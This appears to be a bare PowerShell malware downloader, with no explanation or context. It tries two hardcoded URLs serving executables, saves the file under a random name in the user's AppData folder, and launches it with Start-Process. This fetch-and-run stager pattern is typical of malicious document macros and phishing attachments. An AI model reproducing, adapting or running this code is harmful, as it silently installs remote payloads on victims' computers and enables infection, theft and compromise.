$random = New-Object System.Random; Foreach($um in @({http://dutland.com/tess.exe},{http://www.chalupahanacka.cz/ohn.exe})) { try { $fg = $random.next(0, 61180); $pp = '%appdata%\' + $fg + '.exe'; (new-object system.net.webclient).DownloadFile($um.ToString(), $pp); Start-Process $pp; break; } catch { Write-Host $error[0].Exception } }
